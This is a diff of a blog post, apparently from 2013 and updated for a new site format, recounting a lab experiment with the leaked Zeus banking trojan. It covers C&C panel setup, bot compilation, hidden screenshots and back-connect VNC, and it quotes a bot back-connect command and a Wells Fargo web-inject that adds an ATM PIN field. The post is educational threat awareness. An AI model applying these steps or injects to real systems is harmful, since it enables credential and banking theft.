@@ -7,12 +7,9 @@ comments: true
 date: 2013-09-23T00:00:00Z
 published: true
 title: Zeus - My Adventure with a Infamous Bot
-url: /2013/09/23/zeus-my-adventure-with-a-infamous-bot/
 ---
 
-###### var disclaimer = require('standard\_disclaimer.js');
-
-**NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET AND A ANGRY NATIVE WITH A BIG STICK - ALONE**
+**NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET**
 
 ### Bots for the masses.
 Recently at a conference that I attended, I sat in a class that was talking about Botnets and general 'How Easy They Are' related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not **100%** aware of how ( and I dare say this lightly ) *easy* they have it. The technical competency of the adversary really doesn't have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.
@@ -20,11 +17,11 @@ Recently at a conference that I attended, I sat in a class that was talking abou
 <!--more-->
 
 ### So, botnet?
-In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the [Zeus botnet](http://en.wikipedia.org/wiki/Zeus_(Trojan_horse\)). Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra *features* that you'd like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.
+In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the [Zeus botnet](https://en.wikipedia.org/wiki/Zeus_(malware\)). Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra *features* that you'd like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.
 
-So for $700, you can buy a relatively easy to setup piece of software that would allow you to *steal* credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article [here](http://en.wikipedia.org/wiki/Zeus_(Trojan_horse\)) does a excellent job to describe the process in a image:
+So for $700, you can buy a relatively easy to setup piece of software that would allow you to *steal* credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article [here](https://en.wikipedia.org/wiki/Zeus_(malware\)) does a excellent job to describe the process in a image:
 
-{% img http://upload.wikimedia.org/wikipedia/en/2/2d/FBI_Fraud_Scheme_Zeus_Trojan.jpg %}
+{{< figure src="/images/zues_fraud_scheme.jpg" >}}
 
 ### The Zeus Bot Architecture
 The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a [drive-by download](http://en.wikipedia.org/wiki/Drive-by_download) (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.
@@ -42,7 +39,7 @@ Now that we have the full sources, I decided it's time to setup a LAB to configu
 I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this "Fake Internet". I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.
 
 In short, the lab was going to look something like this:
-```bash Internal Zeus LAB
+```bash
 
                          Virtual Machine Management Interface
                          +----------------------------------->
@@ -82,7 +79,7 @@ I figured I'd start by checking out the code from the [git](https://github.com/V
 
 The folder structure of the directory `output` that is of interest, on disk, looked something like this:
 
-```bash Zeus Sources FOlder Structure
+```bash
 Zeus/output
 ├── builder
 ├── other
@@ -99,22 +96,23 @@ Two other files also exist in the php server root, namely `cp.php` and `gate.php
 
 So, I copied the sources for `server[php]` to a web folder `z/`, fixed up the SELinux contexts for them and tried to access the `cp.php` page. Bam, server error.
 
-```bash Zeus cp.php mb_internal_encoding error
+```bash
+# Zeus cp.php mb_internal_encoding error
 [Mon Sep 23 10:57:45 2013] [error] [client 172.16.50.1] PHP Fatal error:  Call to undefined function mb_internal_encoding() in /var/www/html/z/system/global.php on line 1
 ```
 
 It was pretty obvious I was missing `php-mbstring`, so I went and installed it and restarted Apache. Now, loading my `cp.php`, I was greeted with a polite message asking me how I am :D
 
-{% img http://i.imgur.com/cCgsLBk.png %}
+{{< figure src="/images/zues_cp.png" >}}
 
 #### Installing the Command & Control
 I noticed a install folder in the obtained sources and browsed to `install/` and found a very nice, easy to understand installer:
 
-{% img http://i.imgur.com/e1fYvPG.png %}
+{{< figure src="/images/zues_cp_install.png" >}}
 
 Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database `cpdb` for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.
 
-{% img http://i.imgur.com/La5zzZI.png %}
+{{< figure src="/images/zues_cp_internal.png" >}}
 
 #### Compiling the Bot
 
@@ -122,11 +120,11 @@ With that out of the way, the next step had to be to compile the Zeus bot binary
 
 Next, I browsed to the `output/builder/` folder again and opened the `config.txt` file in notepad. Here, I really had to set minimal options. One to specify the location of the `config.bin` and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the `encryption_key`, which should correspond to the key used when we installed the server side PHP stuff earlier.
 
-{% img http://i.imgur.com/xQQeqQl.png %}
+{{< figure src="/images/zues_compiler_config.png" >}}
 
 The next step was to *compile* the bot. While this may sound complex, it's not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The **compiler** interface looked like this:
 
-{% img http://i.imgur.com/f13Baez.png %}
+{{< figure src="/images/zues_bot_compiler.png" >}}
 
 1,2,3 done. We now have a `zeus-bot.exe`. The malware is now customized to speak to my Command & Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.
 
@@ -142,7 +140,8 @@ I opened Internet Explorer and browsed to the location of `zeus-bot.exe` and cho
 ### From the Bot Herders Perspective
 Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command & Control server. We can see this in the interface, as well as based on the POST requests to `gate.php`
 
-```bash Apache Logs Extract for POST's to gate.php
+```bash
+# Apache Logs Extract for POST's to gate.php
 172.16.50.2 - - [19/Sep/2013:10:58:01 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
 172.16.50.2 - - [19/Sep/2013:10:58:06 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
 172.16.50.2 - - [19/Sep/2013:10:58:12 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
@@ -176,17 +175,17 @@ Assuming the position of the evil bot herder now, I am able to see that I have a
 
 We are also able to, using the control panel, see some more information based on the newly connected bot:
 
-{% img http://i.imgur.com/aKe4kJh.png %}
+{{< figure src="/images/zues_bot_zombie.png" >}}
 
 An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command & Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an *almost live* image. On the client, we can see that the process `explorer.exe` is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.
 
-{% img http://i.imgur.com/fiy0u2N.png %}
+{{< figure src="/images/zues_bot_listener_port.png" >}}
 
 In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.
 
 So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command & Control server **will** be able to connect to. The result?
 
-{% img http://i.imgur.com/GMqlVCM.png %}
+{{< figure src="/images/zues_bot_screenshot.png" >}}
 
 There is **no** visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.
 
@@ -200,7 +199,7 @@ First, the attacker will have to prepare a back connect server and then, via a s
 
 In short, the setup will look something like this.
 
-```bash Back Connect Server
+```bash
    -------------------------->        <--------------------------------------------
    -------------------------->        <--------------------------------------------
 
@@ -213,15 +212,15 @@ The back connect server could be any host the attacker has access to and control
 
 Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:
 
-```bash Back Connect Script
+```bash
 bot_bc_add vnc 172.16.50.181 9000
 ```
 
-This tells the bot where to connect to wait for a VNC session. 
+This tells the bot where to connect to wait for a VNC session.
 
 Next, the attacker can sit and watch hes Back Connect Server's output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate **display**, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It's almost as if hes attaching to another *tty*.
 
-{% img http://i.imgur.com/7tg4l2X.png %}
+{{< figure src="/images/zues_back_connect_vnc.png" >}}
 
 ### Web Injects, the real threat.
 So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called **Web Injects** to manipulate website content. "What do you mean by 'manipulation'?" you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command & Control server. Just like the one we just used to Remotely Administer the infected machines.
@@ -231,7 +230,7 @@ With all this information, he may be able to return at a later stage, VNC to you
 #### How it works
 When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API's in Windows, it is able to monitor for its configured URL's, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source [here](https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63).
 
-```html Wellsfargo Web Inject
+```html
 set_url https://www.wellsfargo.com/* G
 data_before
 <span class="mozcloak"><input type="password"*</span>
@@ -246,7 +245,7 @@ data_end
 
 In the above extract from the web injects we can see that the http**s**://wellsfargo.com (note the s) website will have a extra field added, asking for a *ATM PIN* before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&C.
 
-{% img http://npercoco.typepad.com/.a/6a0133f264aa62970b01910426b229970c-pi %}
+{{< figure src="/images/zues_web_inject_examples.png" >}}
 
 ### Summary
 While Zeus itself is old news and many variants such as [Citadel](http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf) have sprung up, I believe this is still a very valid threat as the concepts remain the same.
